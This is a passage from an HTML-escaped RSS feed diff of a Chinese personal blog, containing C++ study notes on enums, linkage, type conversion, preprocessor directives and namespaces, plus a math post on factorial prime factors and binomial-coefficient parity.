+&lt;pre&gt;&lt;code&gt;enum enum_name{value1,valu2,value3};
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这样我们将定义一个只有3种取值的枚举&lt;/p&gt;
+&lt;p&gt;枚举可以像普通变量一样声明和赋值&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;enum_name e1 = value1;
+e1 = value2;
+std::cout &amp;lt;&amp;lt; (e1==value2);//true
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;枚举常常被用来存储某些只有少数几种情况的设置，如输出的颜色，输出的格式等等&lt;/p&gt;
+&lt;p&gt;枚举的底层实现其实是整数，每个枚举值都会被赋予一个整数，当没有指定时，依次是&lt;code&gt;0,1,2,3,...&lt;/code&gt;，我们可以在定义时显式指定对应值，如&lt;code&gt;enum ename{a=1,b=10};&lt;/code&gt;，枚举的值不一定是连续的，编译器会根据枚举值的范围确定使用多大空间存储枚举&lt;/p&gt;
+&lt;p&gt;也因为如此，枚举可以被当作整数直接使用，但整数不能当作枚举量使，不过我们任然可以通过强制类型转换把整数转换成枚举，如果该整数对应某个枚举量，那么该枚举就是那个枚举量，否则，该枚举不等于任何枚举量，而如果整数超出了该枚举的值的范围，那就会引发未知的错误，总之，不要把整数值强制转换成枚举&lt;/p&gt;
+&lt;p&gt;相同作用域内的枚举不能设置相同的枚举值&lt;/p&gt;
+&lt;p&gt;:::note&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;C++11&lt;/code&gt;引入了一种作用域内枚举，使用&lt;code&gt;enum class&lt;/code&gt;或者&lt;code&gt;enum struct&lt;/code&gt;声明的枚举，其枚举值的作用域为类作用域，使用时必须使用&lt;code&gt;enum_name::value&lt;/code&gt;标明名称空间，这样不同枚举就处于不同的作用域，可以使用重复的枚举值了&lt;/p&gt;
+&lt;p&gt;作用域内枚举同时禁止了枚举值到整型的隐式类型转换，但任然可以强制转换&lt;/p&gt;
+&lt;p&gt;:::&lt;/p&gt;
+&lt;h3&gt;2.4. 其它&lt;/h3&gt;
+&lt;p&gt;类、指针都是复合类型，但由于其内容较多，我们会在后面单独讨论&lt;/p&gt;
+&lt;h2&gt;3. 存储连续性与连接性&lt;/h2&gt;
+&lt;p&gt;从上面可以看出，无论是基本类型还是复合类型，它们都遵守共同的作用域规则，而在作用域规则之外，变量有不同的存储方式与与外部共享的方式，我们叫做存储连续性与连接性。&lt;/p&gt;
+&lt;p&gt;存储连续性在变量一部分已经有介绍，主要有自动存储、静态存储和动态存储三种，而连接性主要针对全局变量（作用域为整个文件的变量）分为内部连接性和外部连接性，即不与外部共享和与外部共享&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;内部连接性：自动变量、用&lt;code&gt;static&lt;/code&gt;修饰的全局变量、全局常量&lt;/li&gt;
+&lt;li&gt;外部连接性：没有&lt;code&gt;static&lt;/code&gt;修饰的全局变量&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;没有&lt;code&gt;static&lt;/code&gt;修饰的静态全局变量是外部连接性，这也是不能在头文件中包含变量定义的原因——头文件中没有&lt;code&gt;static&lt;/code&gt;修饰的变量都会成为外部变量，它们都是外部连续性，在所有文件中可见，会引发多定义报错&lt;/p&gt;
+&lt;p&gt;也为了正常在头文件中定义常量，&lt;code&gt;C++&lt;/code&gt;会将全局常量的连续性设为内部，这样在所有文件中都定义一次也不会引发多定义问题了&lt;/p&gt;
+&lt;p&gt;当然，全局变量的作用域是当前文件，要使用其他文件里的静态全局变量需要使用引用定义，即在定义前加上关键字&lt;code&gt;extern&lt;/code&gt;表示该变量来自文件外&lt;/p&gt;
+&lt;p&gt;:::note&lt;/p&gt;
+&lt;p&gt;值得注意的是，同一个&lt;code&gt;static&lt;/code&gt;关键字在局部变量与全局变量中含义完全不同，在局部变量前加上&lt;code&gt;static&lt;/code&gt;会将自动变量变为静态变量，而全局变量默认就是静态变量，在全局变量前加上&lt;code&gt;static&lt;/code&gt;会将其默认的外部连接性改为内部连接性&lt;/p&gt;
+&lt;p&gt;在&lt;code&gt;C++11&lt;/code&gt;之前，&lt;code&gt;auto&lt;/code&gt;关键字用于指出变量是自动变量，但只能用在默认是自动变量的变量上，并没有什么实际用处，因此，&lt;code&gt;C++11&lt;/code&gt;将该操作符用作了自动类型推断&lt;/p&gt;
+&lt;p&gt;而&lt;code&gt;C&lt;/code&gt;语言中原先有一个&lt;code&gt;register&lt;/code&gt;关键字，用于建议编译器使用&lt;code&gt;CPU&lt;/code&gt;寄存器来存储此变量，在&lt;code&gt;C++11&lt;/code&gt;中删除了这一功能，转而将原本&lt;code&gt;auto&lt;/code&gt;的作用转移给&lt;code&gt;register&lt;/code&gt;，但依然只能用于自动变量，故该关键字唯一的用处只是在全局变量和自动变量重名时提醒读代码的人这是自动变量&lt;/p&gt;
+&lt;p&gt;保留&lt;code&gt;register&lt;/code&gt;的主要原因是，&lt;code&gt;register&lt;/code&gt;原先的功能很好用（现在编译器可以自动完成这一优化了），使用非常广泛，轻易移除会导致以前的代码大规模报错，所以干脆给了一个没实际用处的功能了&lt;/p&gt;
+&lt;p&gt;:::&lt;/p&gt;
+&lt;h2&gt;4. 类型转换&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;C++&lt;/code&gt;中基本数据类型之间可以转换，分为隐式转换和显式转换&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;隐式转换&lt;/p&gt;
+&lt;p&gt;在赋值时会自动进行所有支持的隐式转换&lt;/p&gt;
+&lt;p&gt;在计算表达式式，若表达式两边不同，也会进行隐式转换，规则如下&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;如果一个整型和浮点数操作，会将整型转换成浮点数&lt;/li&gt;
+&lt;li&gt;如果两个不同长度整型或者两个不同长度浮点数操作，会将长度短的转换成长度长的&lt;/li&gt;
+&lt;li&gt;如果不同长度的有符号和无符号数操作，若有符号数可以表示无符号数的所有可能，则转换为有符号数，否则转换为无符号数&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;bool&lt;/code&gt;型视为整型处理&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;显式转换&lt;/p&gt;
+&lt;p&gt;在&lt;code&gt;C&lt;/code&gt;语言中，使用&lt;code&gt;(typename)&lt;/code&gt;操作符可以对变量进行显式转换，也叫强制转换，在&lt;code&gt;C++&lt;/code&gt;中新增加了使用&lt;code&gt;typename()&lt;/code&gt;这种类似函数调用的方法，其效果是一样的，显式转换可以处理一些不会进行隐式转换的场景，但这种操作往往存在较大风险，需谨慎使用&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;类型转换可能会产生很多问题：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;当较大整型转换成浮点数时，存在精度问题，而浮点数转换为整型时，小数部分会被直接舍去，大浮点数转换成整型时会直接转成类型支持的最大值&lt;/li&gt;
+&lt;li&gt;当较长浮点数转换成较短浮点数时会产生精度损失，而较长整型转换成较短整型时，超出部分会被直接截断舍去&lt;/li&gt;
+&lt;li&gt;当有符号数转换成无符号数时，会直接把补码当作无符号数处理&lt;/li&gt;
+&lt;li&gt;当其他类型转换成布尔型时，只要不是全&lt;code&gt;0&lt;/code&gt;都会被转换为&lt;code&gt;true&lt;/code&gt;，反之，&lt;code&gt;true&lt;/code&gt;会被转换为&lt;code&gt;1&lt;/code&gt;，&lt;code&gt;false&lt;/code&gt;会被转换成&lt;code&gt;0&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</content:encoded></item><item><title>阶乘因数问题</title><link>https://ssl.ztsubaki.xyz/posts/12/12/</link><guid isPermaLink="true">https://ssl.ztsubaki.xyz/posts/12/12/</guid><description>妙哇</description><pubDate>Thu, 27 Feb 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;1. 阶乘的因数个数&lt;/h2&gt;
+&lt;p&gt;考虑一个正整数$n$的阶乘$n!$，求它有多少个质因数$p$，即求最大$i$，使$n!=kp^i$&lt;/p&gt;
+&lt;p&gt;显然，所有$p$的倍数都含有至少一个因数$p$，从$1$到$n$的$n$个数中有$\lfloor\dfrac{n}{p}\rfloor$个数是$p$的倍数&lt;/p&gt;
+&lt;p&gt;同样的，所有$p^2$的倍数都含有至少两个因数$p$，从$1$到$n$的$n$个数中有$\lfloor\dfrac{n}{p^2}\rfloor$个数是$p^2$的倍数&lt;/p&gt;
+&lt;p&gt;以此类推，所有$p^j$的倍数都含有至少$i$个因数$p$，从$1$到$n$的$n$个数中有$\lfloor\dfrac{n}{p^j}\rfloor$个数是$p^i$的倍数&lt;/p&gt;
+&lt;p&gt;当然，$p^2$的倍数也是$p$的倍数，$p^j$的倍数也是$p^{j-1}$的倍数，所以我们可以认为，每个$p^2$的倍数都在$p$倍数的基础上多一个因子$p$，每个$p^{j}$的倍数都在$p^{j-1}$倍数的基础上多一个因子$p$，那么我们就得出了最后的式子&lt;/p&gt;
+&lt;p&gt;$$i= \lfloor\dfrac{n}{p}\rfloor+\lfloor\dfrac{n}{p^2}\rfloor+\lfloor\dfrac{n}{p^3}\rfloor+\cdots$$&lt;/p&gt;
+&lt;h2&gt;2. 二进制与组合数奇偶&lt;/h2&gt;
+&lt;p&gt;对于一个组合数$C^m_n=\dfrac{n!}{m!(n-m)!}$，要讨论它的奇偶，也就是看它分子分母含因子$2$的情况&lt;/p&gt;
+&lt;p&gt;设$a,b,c$分别为$n!,m!,(n-m)!$含因子$2$的数目&lt;/p&gt;
+&lt;p&gt;$C^m_n\mod{2}=\begin{cases}0,a&amp;gt;b+c\1,a\le b+c\end{cases}$&lt;/p&gt;
+&lt;p&gt;显然，$a&amp;lt;b+c$时，$C^m_n$中会产生$2$的负次幂，而$C^m_n$是一个整数，所以$a$不可能小于$b+c$&lt;/p&gt;
+&lt;p&gt;所以有&lt;/p&gt;
+&lt;p&gt;$C^m_n\mod{2}=\begin{cases}0,a\ne b+c\1,a= b+c\end{cases}$&lt;/p&gt;
+&lt;p&gt;那么我们来分析$a,b,c$&lt;/p&gt;
+&lt;p&gt;以$a$为例，$a=\lfloor\dfrac{n}{2}\rfloor+\lfloor\dfrac{n}{2^2}\rfloor+\lfloor\dfrac{n}{2^3}\rfloor+\cdots$&lt;/p&gt;
+&lt;p&gt;设$n=a_0\times 2^0+a_1\times 2^1+a_2\times 2^2+\cdots+a_i\times 2^i$，有&lt;/p&gt;
+&lt;p&gt;$$a=\lfloor\dfrac{a_0\times 2^0+a_1\times 2^1+\cdots+a_i\times 2^i}{2}\rfloor+\lfloor\dfrac{a_0\times 2^0+a_1\times 2^1+\cdots+a_i\times 2^i}{2^2}\rfloor+\cdots+\lfloor\dfrac{a_0\times 2^0+a_1\times 2^1+\cdots+a_i\times 2^i}{2^i}\rfloor\=\dfrac{a_1\times 2^1+a_2\times 2^2+\cdots+a_i\times 2^i}{2}+\dfrac{a_2\times 2^2+a_3\times 2^3+\cdots+a_i\times 2^i}{2^2}+\cdots+\dfrac{a_i\times 2^i}{2^i}\=(a_1+a_2\times 2^1+\cdots+a_i\times 2^{i-1})+(a_2+a_3\times 2^1+\cdots+a_i\times 2^{i-2})+\cdots+a_i\=a_1+a_2(2^0+2^1)+a_3(2^0+2^1+2^2)+\cdots+a_i(2^0+2^1+\cdots+2^{i-1})\=a_0(2^0-1)+a_1(2^1-1)+a_2(2^2-1)+\cdots+a_i(2^i-1)\=\sum^{i}&lt;em&gt;{j=0}{a_j(2^j-1)}=\sum^{i}&lt;/em&gt;{j=0}{a_j2^j}-\sum^{i}&lt;em&gt;{j=0}a_j=n-\sum^{i}&lt;/em&gt;{j=0}a_j$$&lt;/p&gt;
+&lt;p&gt;不难发现，$\sum^{i}_{j=0}a_j$就是$n$的二进制中$1$的数目&lt;/p&gt;
+&lt;p&gt;同理可得，$b=m-\sum^{i}&lt;em&gt;{j=0}b_j,c=n-m-\sum^{i}&lt;/em&gt;{j=0}c_j$&lt;/p&gt;
+&lt;p&gt;则$a=b+c\Longleftrightarrow n-\sum^{i}&lt;em&gt;{j=0}a_j = m-\sum^{i}&lt;/em&gt;{j=0}b_j + n-m-\sum^{i}&lt;em&gt;{j=0}c_j\Longleftrightarrow \sum^{i}&lt;/em&gt;{j=0}a_j = \sum^{i}&lt;em&gt;{j=0}b_j+\sum^{i}&lt;/em&gt;{j=0}c_j$&lt;/p&gt;
+&lt;p&gt;也就是说，$n$二进制中$1$的数目等于$m$二进制中$1$的数目和$n-m$二进制中$1$的数目之和&lt;/p&gt;
+&lt;p&gt;换句话说，$m$二进制中有几个$1$，$n-m$时$n$的二进制中就减少几个$1$&lt;/p&gt;
+&lt;p&gt;来到二进制减法中，对于$m$中某个为$1$的位，如果$n$中对应位为$1$，那么计算减法时$n$就刚好减少一个$1$，而如果$n$中对应位为$0$，则必然产生退位$(n\ge m)$，必然增加$n$中$1$的个数，因此，对于$m$中所有为$1$的位，只有$n$中每个对应位都为$1$时，上述式子才会成立&lt;/p&gt;
+&lt;p&gt;用按位与$(&amp;amp;)$描述这一条件就是$n&amp;amp;m=m$&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;综上，我们得出结论$C^m_n\mod2=\begin{cases}0,n&amp;amp;m\ne m\1,n&amp;amp;m=m\end{cases}$&lt;/strong&gt;&lt;/p&gt;
+</content:encoded></item><item><title>C++基础二：编译指令</title><link>https://ssl.ztsubaki.xyz/posts/11/11/</link><guid isPermaLink="true">https://ssl.ztsubaki.xyz/posts/11/11/</guid><description>2025年春，C++复习笔记</description><pubDate>Wed, 26 Feb 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;1. 包含文件&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;#include&lt;/code&gt;编译指令可以将外部文件包含在源文件中，在预编译时，预编译器会使用外部文件的内容替换掉&lt;code&gt;#include&lt;/code&gt;指令&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;C++&lt;/code&gt;中，如果需要使用其它文件中的函数，甚至是编译好的库、系统调用函数，需要提供函数声明以告诉编译器函数的形式，并等到链接时再从外部查找函数的内容，而一个库往往包含大量的函数声明、复合类型、符号常量的定义等，这些定义错综复杂，为了方便所有程序使用这些库，开发者们往往把所有这些调用库需要的信息放在一个文件中，称为&lt;strong&gt;头文件&lt;/strong&gt;，常用扩展名&lt;code&gt;.h&lt;/code&gt;或&lt;code&gt;.hpp&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;头文件也是一个合法的&lt;code&gt;C++&lt;/code&gt;源文件，只是里面一般只包含函数声明、复合类型的定义、符号常量等需要在文件之间共享的内容，而不包含具体实现，在链接时需要链接含有具体实现的目标文件&lt;/p&gt;
+&lt;p&gt;而&lt;code&gt;#include&lt;/code&gt;指令就可以用于引入头文件，这样一来，只用引入头文件就可以使用头文件中所有的内容了&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;#include&amp;lt;file&amp;gt;&lt;/code&gt;用于引入系统头文件，编译器会在系统环境变量配置的搜索路径中搜索头文件，这类头文件由系统或第三方软件包提供，其实现一般放在系统库路径下的链接库中，编译器在链接时会自动链接这些代码，一般情况下不用手动链接&lt;/p&gt;
+&lt;p&gt;可以在编译时使用&lt;code&gt;-l&lt;/code&gt;指令导入库，相当于导入对应的头文件，也可以用&lt;code&gt;-L&lt;/code&gt;指令添加一个搜索路径&lt;/p&gt;
+&lt;p&gt;:::note&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;C&lt;/code&gt;中系统头文件也使用&lt;code&gt;.h&lt;/code&gt;拓展名，而&lt;code&gt;C++&lt;/code&gt;更改了这一设定，&lt;code&gt;C++&lt;/code&gt;中的头文件都是没有拓展名的，如&lt;code&gt;iostream&lt;/code&gt;，当然，&lt;code&gt;C++&lt;/code&gt;中可以使用&lt;code&gt;C&lt;/code&gt;的头文件，不过推荐不使用拓展名而在前面加一个字母&lt;code&gt;c&lt;/code&gt;区分，如在&lt;code&gt;C++&lt;/code&gt;中&lt;code&gt;#include&amp;lt;stdio.h&amp;gt;&lt;/code&gt;和&lt;code&gt;#include&amp;lt;cstdio&amp;gt;&lt;/code&gt;是一样的效果，都指向&lt;code&gt;stdio.h&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;:::&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;#include&quot;file&quot;&lt;/code&gt;用于引入项目中的头文件，填写头文件相对该文件的相对路径即可，需要自己实现头文件中的内容，并在链接时链接上，编译时也要加入这个头文件&lt;/p&gt;
+&lt;p&gt;例如&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;//hello.h
+int hello();
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;该头文件告诉编译器有一个函数&lt;code&gt;int hello()&lt;/code&gt;，接下来只要引入这个头文件就可以使用这个函数，而不用关心函数实现&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;//main.cpp
+#include &quot;hello.h&quot;
+
+int main()
+{
+    hello();
+    return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;使用如下命令可以正常编译这个程序为目标代码&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;g++ -o main.o -c main.cpp hello.h
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;但是如果试图将其编译为可执行程序会报错，因为我们并没有提供&lt;code&gt;int hello()&lt;/code&gt;的实现，链接器找不到这个函数&lt;/p&gt;
+&lt;p&gt;我们需要实现一下这个函数&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;//hello.cpp
+#include &amp;lt;iostream&amp;gt; //引入系统头文件提供标准IO
+#include &quot;hello.h&quot;
+
+int hello()
+{
+    std::cout &amp;lt;&amp;lt; &quot;hello, world&quot;;
+    return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;接下来，我们使用一样的方法编译该程序&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;g++ -o hello.o hello.cpp hello.h
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;然后将两个目标代码链接在一起&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;g++ -o ./hello hello.o main.o
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这样链接器就可以找到&lt;code&gt;int hello()&lt;/code&gt;的实现，然后正常编译出可执行程序了&lt;/p&gt;
+&lt;p&gt;当然，也可以直接编译三个文件&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;g++ -o ./hello hello.h hello.cpp main.cpp
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;:::important&lt;/p&gt;
+&lt;p&gt;引入大量头文件会极大增加名称冲突的可能，也会大大增加链接器查找的时间，大大降低编译速度，故开发中不建议引入大量无关头文件，尤其大项目中禁止使用“万能头”之类的头文件&lt;/p&gt;
+&lt;p&gt;:::&lt;/p&gt;
+&lt;p&gt;:::important&lt;/p&gt;
+&lt;p&gt;头文件中的代码会在每个文件中被重复运行，故请不要在头文件中包含任何变量声明（可以声明常量）、函数实现（内联函数、虚函数除外）&lt;/p&gt;
+&lt;p&gt;:::&lt;/p&gt;
+&lt;h2&gt;2. 宏定义&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;#define&lt;/code&gt;指令会定义一个宏，可以用作标识，也可以用作文本替换&lt;/p&gt;
+&lt;h3&gt;2.1. 符号常量&lt;/h3&gt;
+&lt;p&gt;&lt;code&gt;#define name value&lt;/code&gt;会搜索源文件中所有&lt;code&gt;name&lt;/code&gt;并替换为&lt;code&gt;value&lt;/code&gt;，我们把这种方式定义的常量称为符号常量&lt;/p&gt;
+&lt;p&gt;符号常量在正式编译前就被替换，不会占用内存空间，也不存在类型，只是简单的文本替换，但是也因为这样可能会产生潜在的问题，&lt;code&gt;C++&lt;/code&gt;不建议使用这种方式定义常量，但&lt;code&gt;C&lt;/code&gt;只能这样定义常量，如果考虑兼容&lt;code&gt;C&lt;/code&gt;，则必须使用符号常量&lt;/p&gt;
+&lt;p&gt;头文件中常常使用符号常量来定义一些静态常量，如&lt;code&gt;climits&lt;/code&gt;中对各数据类型最大值的定义&lt;/p&gt;
+&lt;p&gt;当然，这种宏也可以用来替换部分代码，你甚至可以用&lt;code&gt;#define + -&lt;/code&gt;来把所有加法变成减法，~不过应该不会有人这么干吧~&lt;/p&gt;
+&lt;h3&gt;2.2. 带参宏定义&lt;/h3&gt;
+&lt;p&gt;宏定义可以携带参数，产生类似于函数的用法，如&lt;code&gt;#define ADD(x,y) (x+y)&lt;/code&gt;会在编译前把复合条件的表达式替换掉，如&lt;code&gt;ADD(1,2)&lt;/code&gt;替换为&lt;code&gt;(1+2)&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;但是相比函数，这种定义虽然效率高，但是没有类型检查，就算&lt;code&gt;ADD(&quot;1&quot;,2)&lt;/code&gt;也会被替换为&lt;code&gt;&quot;1&quot;+2&lt;/code&gt;，无法通过编译&lt;/p&gt;
+&lt;p&gt;可以使用&lt;code&gt;#&lt;/code&gt;来将变量视为字符串替换，如&lt;code&gt;#define TEST(x) #x&lt;/code&gt;，会把&lt;code&gt;TEST(1+2)&lt;/code&gt;替换为&lt;code&gt;&quot;1+2&quot;&lt;/code&gt;，而不是&lt;code&gt;1+2&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;可以使用&lt;code&gt;##&lt;/code&gt;来替换部分元素，即拼接被替换部分与前面的元素，如&lt;code&gt;#define TEST(x) a##x&lt;/code&gt;，会吧&lt;code&gt;TEST(1)&lt;/code&gt;替换为&lt;code&gt;a1&lt;/code&gt;&lt;/p&gt;
+&lt;h3&gt;2.3. 条件编译&lt;/h3&gt;
+&lt;p&gt;在使用头文件时，头文件可能又包含其它头文件，项目变得复杂后，可能会导致重复包含头文件，导致重复定义使编译失败&lt;/p&gt;
+&lt;p&gt;为了避免这个问题，我们往往会在头文件开头使用条件编译&lt;code&gt;#ifndef TEST_H&lt;/code&gt;，之后在末尾定义宏&lt;code&gt;#define TEST_H&lt;/code&gt;，再使用条件编译&lt;code&gt;#endif&lt;/code&gt;，这样在预编译过程中只有没有定义过&lt;code&gt;TEST_H&lt;/code&gt;宏时才会保留&lt;code&gt;ifndef&lt;/code&gt;和&lt;code&gt;endif&lt;/code&gt;中间的内容，而解析过一次该内容后就会定义宏，最终只会保留一份了&lt;/p&gt;
+&lt;p&gt;常用的指令还有&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;ifdef&lt;/code&gt;：定义过该宏才会保留这些内容&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;undef&lt;/code&gt;：取消宏定义&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;else&lt;/code&gt;：与&lt;code&gt;ifdef&lt;/code&gt;或&lt;code&gt;ifndef&lt;/code&gt;一同使用，放在&lt;code&gt;endif&lt;/code&gt;前，当不满足条件时保留&lt;code&gt;else&lt;/code&gt;和&lt;code&gt;endif&lt;/code&gt;中间的内容，反之保留&lt;code&gt;ifdef/ifndef&lt;/code&gt;和&lt;code&gt;else&lt;/code&gt;中间的内容&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;为了区分不同的目标平台，编译器也会定义一些告诉程序目标平台的宏，利用这些宏和条件编译指令可以实现针对不同平台编译不同代码，常用于&lt;code&gt;Windows&lt;/code&gt;和&lt;code&gt;POSIX&lt;/code&gt;系统使用同一套代码时&lt;/p&gt;
+&lt;h2&gt;3. 类型别名&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;#typedef type alia&lt;/code&gt;可以为&lt;code&gt;type&lt;/code&gt;类型设置别名&lt;code&gt;alia&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;#define&lt;/code&gt;也可以实现这样的功能，但&lt;code&gt;#define&lt;/code&gt;只是在预处理时进行文本替换，而&lt;code&gt;#typedef&lt;/code&gt;会在编译时交给编译器处理，比&lt;code&gt;#define&lt;/code&gt;安全很多&lt;/p&gt;
+&lt;p&gt;使用&lt;code&gt;#typedef&lt;/code&gt;定义的类型通常带有&lt;code&gt;_t&lt;/code&gt;后缀，前面数据类型一节提到的&lt;code&gt;int16_t&lt;/code&gt;、&lt;code&gt;size_t&lt;/code&gt;等正是用这种方法定义的，这个定义由编译器完成，我们不用关心到底是哪种数据类型，只要知道它是当前编译器中特定长度的类型就可以了&lt;/p&gt;
+&lt;p&gt;在实际应用中&lt;code&gt;#typedef&lt;/code&gt;也是这样的功能，不用关心到底是哪种类型，只要确定用途就行，需要时可以快速更改&lt;/p&gt;
+&lt;h2&gt;4. 名称空间&lt;/h2&gt;
+&lt;p&gt;名称空间是&lt;code&gt;C++&lt;/code&gt;中独有的概念&lt;/p&gt;
+&lt;p&gt;当程序变得复杂，尤其是使用了很多库之后，可能有很多重名的变量，为了区分这些变量，&lt;code&gt;C++&lt;/code&gt;引入了名称空间的概念，可以使用&lt;code&gt;namespace{}&lt;/code&gt;规定一块名称空间，名称空间之外的程序要访问内部定义的内存就需要使用作用域解析运算符&lt;code&gt;::&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;namespace alice{
+    int a = 1;
+}
+namespace bob{
+    int a = 2;
+}
+std::cout &amp;lt;&amp;lt; a;//incorrect
+std::cout &amp;lt;&amp;lt; alice::a;//1
+std::cout &amp;lt;&amp;lt; bob::a;//2
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;类的成员也会自动带上类名称空间，名称空间可以嵌套，&lt;code&gt;C++&lt;/code&gt;标准库中的名称往往定义在&lt;code&gt;std&lt;/code&gt;名称空间下&lt;/p&gt;
+&lt;p&gt;而每次都写一串名称空间都很麻烦，于是我们有了&lt;code&gt;using&lt;/code&gt;命令，可以明确某一个量的名称空间，如上述例子中，若使用&lt;code&gt;using alice::a;&lt;/code&gt;，则后面使用的所有&lt;code&gt;a&lt;/code&gt;都默认为&lt;code&gt;alice::a&lt;/code&gt;（仍然可以使用&lt;code&gt;bob::a&lt;/code&gt;，不冲突）&lt;/p&gt;
+&lt;p&gt;但是如果量很多，还是很麻烦，这样就出现了&lt;code&gt;using&lt;/code&gt;编译指令&lt;/p&gt;
+&lt;p&gt;如&lt;code&gt;using namespace std;&lt;/code&gt;会把所有用到的量（而非定义的）量视为&lt;code&gt;std&lt;/code&gt;名称空间下的量，免去每次都写&lt;code&gt;std&lt;/code&gt;的麻烦，同时需要使用其他名称空间的量时也可以指定其他的名称空间来覆盖掉&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;using&lt;/code&gt;指令和编译指令的作用范围都仅限当前作用域，即当前大括号内，&lt;code&gt;using&lt;/code&gt;编译指令也可以嵌套&lt;/p&gt;
+&lt;p&gt;由于&lt;code&gt;using&lt;/code&gt;编译指令会引入大量用不到的量，可能产生名称冲突，带来不必要的麻烦，故不推荐使用&lt;code&gt;using&lt;/code&gt;编译指令&lt;/p&gt;
+</content:encoded></item><item><title>C++基础一：基础元素</title><link>https://ssl.ztsubaki.xyz/posts/9/9/</link><guid isPermaLink="true">https://ssl.ztsubaki.xyz/posts/9/9/</guid><description>2025年春，C++复习笔记</description><pubDate>Wed, 05 Feb 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;1. C++简介&lt;/h2&gt;
+&lt;h3&gt;1.1. C++简史&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;20世纪70年代，贝尔实验室的Dennins Ritchie为了开发&lt;code&gt;UNIX&lt;/code&gt;系统而开发了&lt;code&gt;C&lt;/code&gt;语言&lt;/li&gt;
+&lt;li&gt;20世纪80年代，贝尔实验室的Bjarne Stroustrup为了使&lt;code&gt;C&lt;/code&gt;语言更易用，在&lt;code&gt;C&lt;/code&gt;语言的基础上引入了对面向对象编程和泛型编程的支持，发明了&lt;code&gt;C++&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;20世纪90年代，ANSI与ISO联合制定了&lt;code&gt;C++&lt;/code&gt;的第一个标准&lt;code&gt;ISO/IEC 14882:1998&lt;/code&gt;，并获得了ISO, IEC和ANSI批准，称为&lt;code&gt;C++98&lt;/code&gt;，在最初的&lt;code&gt;C++&lt;/code&gt;基础上还加入了&lt;code&gt;STL&lt;/code&gt;、运行阶段类型识别、模板和异常&lt;/li&gt;
+&lt;li&gt;2003年，&lt;code&gt;ISO/IEC 14882:2003&lt;/code&gt;发布，主要对上一版进行修订，没有改变语言特性，故常用&lt;code&gt;C++98&lt;/code&gt;表示&lt;code&gt;C++98/C++2003&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;2011年，&lt;code&gt;ISO/IEC 14882:2011&lt;/code&gt;发布，增加了一些特性，称为&lt;code&gt;C++11&lt;/code&gt;，也是目前比较常用的版本&lt;/li&gt;
+&lt;li&gt;此后陆续发布的版本有&lt;code&gt;C++14&lt;/code&gt;、&lt;code&gt;C++17&lt;/code&gt;、&lt;code&gt;C++20&lt;/code&gt;、&lt;code&gt;C++23&lt;/code&gt;、&lt;code&gt;C++26&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;1.2. C++的特点&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;编译式&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;结构化&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;底层系统接口&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;面向对象&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;泛型编程&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;1.3. C++的编译器&lt;/h3&gt;
